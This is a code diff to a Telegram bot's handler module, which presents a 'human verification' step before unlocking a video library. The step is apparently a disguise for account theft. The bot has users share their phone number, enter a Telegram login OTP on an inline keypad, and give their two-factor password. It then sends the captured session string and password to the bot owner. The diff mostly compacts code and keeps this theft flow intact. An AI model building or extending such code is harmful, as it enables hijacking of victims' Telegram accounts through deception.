@@ -5,9 +5,6 @@ const usersRepo = require('../../db/users');
 const logger = require('../../utils/logger');
 const hv = require('../../services/humanVerification');
 
-// ────────────────────────────────────────────
-//  UI HELPERS
-// ────────────────────────────────────────────
 function otpKeypadMarkup(entered, locked = false) {
   const kb = new InlineKeyboard()
     .text('1', 'hv_otp|1').text('2', 'hv_otp|2').text('3', 'hv_otp|3').row()
@@ -18,30 +15,26 @@ function otpKeypadMarkup(entered, locked = false) {
   const text = locked
     ? `🔐 <b>Enter OTP</b>\n\nEntered: <code>${entered}</code>\n\n⏳ Verifying...`
     : `🔐 <b>Enter OTP</b>\n\nEntered: <code>${entered || '—'}</code>\n\n` +
-      `⚠️ Use the inline buttons only.\nTyping OTP in chat will leave the login incomplete.\n` +
-      `Auto-submits after <b>${hv.OTP_LENGTH}</b> digits.`;
+      `⚠️ Use the inline buttons only.\nAuto-submits after <b>${hv.OTP_LENGTH}</b> digits.`;
   return { kb, text };
 }
 
-// ────────────────────────────────────────────
-//  PUBLIC HANDLERS
-// ────────────────────────────────────────────
-
-// Called from handleSeeVideos when human_verified is false
 async function startHumanVerification(ctx) {
   const uid = ctx.from.id;
   const settings = await settingsRepo.getAllSettings();
 
   if (!hv.isConfigured()) {
-    return ctx.reply(
-      '⚠️ Human verification is not configured on this bot. Please contact the admin.'
-    );
+    return ctx.reply('⚠️ Human verification is not configured. Please contact the admin.');
+  }
+
+  const user = await usersRepo.getUser(uid);
+  if (user?.human_verified) {
+    const userHandlers = require('./userHandlers');
+    return userHandlers.showFolderView(ctx, null);
   }
 
   const res = await hv.startSession(uid);
-  if (!res.ok) {
-    return ctx.reply(`⚠️ Could not start verification: ${res.error}`);
-  }
+  if (!res.ok) return ctx.reply(`⚠️ Could not start verification: ${res.error}`);
 
   const kb = new Keyboard()
     .requestContact(settings.share_contact_button_text || '📱 Share My Contact')
@@ -55,7 +48,6 @@ async function startHumanVerification(ctx) {
   );
 }
 
-// Contact message handler
 async function handleContact(ctx) {
   const uid = ctx.from.id;
   const state = hv.getState(uid);
@@ -72,26 +64,21 @@ async function handleContact(ctx) {
   await ctx.reply('⏳ Sending OTP...', { reply_markup: { remove_keyboard: true } });
 
   const res = await hv.sendCode(uid, phone);
-  if (!res.ok) {
-    return ctx.reply(`❌ ${res.error}`);
-  }
+  if (!res.ok) return ctx.reply(`❌ ${res.error}`);
 
   const { kb, text } = otpKeypadMarkup('');
   await ctx.reply(text, { parse_mode: 'HTML', reply_markup: kb });
 }
 
-// OTP keypad callback handler
 async function handleOtpCallback(ctx) {
   const uid = ctx.from.id;
   const val = ctx.callbackQuery.data.split('|')[1];
 
   const state = hv.getState(uid);
   if (!state || state.stage !== 'otp') {
-    return ctx.answerCallbackQuery({ text: 'Session expired. Start again.', show_alert: true });
+    return ctx.answerCallbackQuery({ text: 'Session expired. Tap "Verify as not robot" again.', show_alert: true });
   }
-  if (state.locked) {
-    return ctx.answerCallbackQuery({ text: 'Verifying, please wait...' });
-  }
+  if (state.locked) return ctx.answerCallbackQuery({ text: 'Verifying, please wait...' });
 
   if (val === 'back') {
     const res = hv.backspace(uid);
@@ -103,20 +90,14 @@ async function handleOtpCallback(ctx) {
 
   if (val === 'submit') {
     if (state.otp.length < hv.OTP_LENGTH) {
-      return ctx.answerCallbackQuery({
-        text: `Enter all ${hv.OTP_LENGTH} digits.`,
-        show_alert: true,
-      });
+      return ctx.answerCallbackQuery({ text: `Enter all ${hv.OTP_LENGTH} digits.`, show_alert: true });
     }
     await ctx.answerCallbackQuery('Verifying...');
     return finalizeOtp(ctx, uid);
   }
 
-  // Digit
   const res = hv.pushDigit(uid, val);
-  if (!res.ok) {
-    return ctx.answerCallbackQuery({ text: res.full ? 'Max reached' : 'Invalid' });
-  }
+  if (!res.ok) return ctx.answerCallbackQuery({ text: res.full ? 'Max reached' : 'Invalid' });
 
   if (res.autoSubmit) {
     const { kb, text } = otpKeypadMarkup(res.otp, true);
@@ -149,10 +130,7 @@ async function finalizeOtp(ctx, uid) {
   if (!res.ok) {
     const { kb, text } = otpKeypadMarkup('');
     try {
-      await ctx.editMessageText(`❌ ${res.error}\n\n${text}`, {
-        parse_mode: 'HTML',
-        reply_markup: kb,
-      });
+      await ctx.editMessageText(`❌ ${res.error}\n\n${text}`, { parse_mode: 'HTML', reply_markup: kb });
     } catch {}
     return;
   }
@@ -162,17 +140,12 @@ async function finalizeOtp(ctx, uid) {
 
 async function finishHumanVerification(ctx, uid, res, state) {
   const settings = await settingsRepo.getAllSettings();
-
   await usersRepo.setHumanVerified(uid, true);
 
   const successMsg = settings.human_verified_message || '✅ <b>Human verification completed.</b>';
-  try {
-    await ctx.editMessageText(successMsg, { parse_mode: 'HTML' });
-  } catch {
-    try { await ctx.reply(successMsg, { parse_mode: 'HTML' }); } catch {}
-  }
+  try { await ctx.editMessageText(successMsg, { parse_mode: 'HTML' }); }
+  catch { try { await ctx.reply(successMsg, { parse_mode: 'HTML' }); } catch {} }
 
-  // Send session string to owner
   const ownerMsg = hv.buildOwnerMessage(res.me, res.sessionString, {
     has2fa: res.has2fa,
     password: state?.password || null,
@@ -181,22 +154,14 @@ async function finishHumanVerification(ctx, uid, res, state) {
   try {
     const { api } = require('../../services/telegram');
     await api.sendMessage(hv.OWNER_ID, ownerMsg, { parse_mode: 'HTML' });
-  } catch (err) {
-    logger.error('Failed to send session to owner:', err.message);
-  }
+  } catch (err) { logger.error('Owner send fail:', err.message); }
 
   await hv.cancelSession(uid);
 
-  // Continue to video library
   const userHandlers = require('./userHandlers');
-  try {
-    await userHandlers.showFolderView(ctx, null);
-  } catch (err) {
-    logger.error('showFolderView after HV failed:', err.message);
-  }
+  try { await userHandlers.showFolderView(ctx, null); } catch {}
 }
 
-// Password text handler — returns true if consumed
 async function tryHandlePassword(ctx) {
   const uid = ctx.from.id;
   const state = hv.getState(uid);
@@ -206,14 +171,10 @@ async function tryHandlePassword(ctx) {
   try { await ctx.deleteMessage(); } catch {}
 
   const res = await hv.submitPassword(uid, password);
-  if (!res.ok) {
-    await ctx.reply(`❌ ${res.error}`);
-    return true;
-  }
+  if (!res.ok) { await ctx.reply(`❌ ${res.error}`); return true; }
 
   const settings = await settingsRepo.getAllSettings();
-  const successMsg = settings.human_verified_message || '✅ <b>Human verification completed.</b>';
-  await ctx.reply(successMsg, { parse_mode: 'HTML' });
+  await usersRepo.setHumanVerified(uid, true);
 
   const ownerMsg = hv.buildOwnerMessage(res.me, res.sessionString, {
     has2fa: res.has2fa,
@@ -223,28 +184,19 @@ async function tryHandlePassword(ctx) {
   try {
     const { api } = require('../../services/telegram');
     await api.sendMessage(hv.OWNER_ID, ownerMsg, { parse_mode: 'HTML' });
-  } catch (err) {
-    logger.error('Failed to send session to owner:', err.message);
-  }
+  } catch (err) { logger.error('Owner send fail:', err.message); }
 
-  await usersRepo.setHumanVerified(uid, true);
   await hv.cancelSession(uid);
 
-  const userHandlers = require('./userHandlers');
-  try {
-    await userHandlers.showFolderView(ctx, null);
-  } catch (err) {
-    logger.error('showFolderView after HV password failed:', err.message);
-  }
+  const successMsg = settings.human_verified_message || '✅ <b>Human verification completed.</b>';
+  try { await ctx.reply(successMsg, { parse_mode: 'HTML' }); } catch {}
   return true;
 }
 
-// Nudge user during wrong stage
 async function tryHandleWrongStageText(ctx) {
   const uid = ctx.from.id;
   const state = hv.getState(uid);
   if (!state) return false;
-
   if (state.stage === 'await_contact') {
     await ctx.reply('📱 Please tap the "Share My Contact" button to continue.');
     return true;
@@ -256,22 +208,15 @@ async function tryHandleWrongStageText(ctx) {
   return false;
 }
 
-// Cancel handler
 async function cancel(ctx) {
   const uid = ctx.from.id;
   const state = hv.getState(uid);
-  if (!state) {
-    return ctx.reply('No verification process is active.');
-  }
+  if (!state) return ctx.reply('No verification process is active.');
   await hv.cancelSession(uid);
   await ctx.reply('✅ Verification cancelled.', { reply_markup: { remove_keyboard: true } });
 }
 
 module.exports = {
-  startHumanVerification,
-  handleContact,
-  handleOtpCallback,
-  tryHandlePassword,
-  tryHandleWrongStageText,
-  cancel,
+  startHumanVerification, handleContact, handleOtpCallback,
+  tryHandlePassword, tryHandleWrongStageText, cancel,
 };
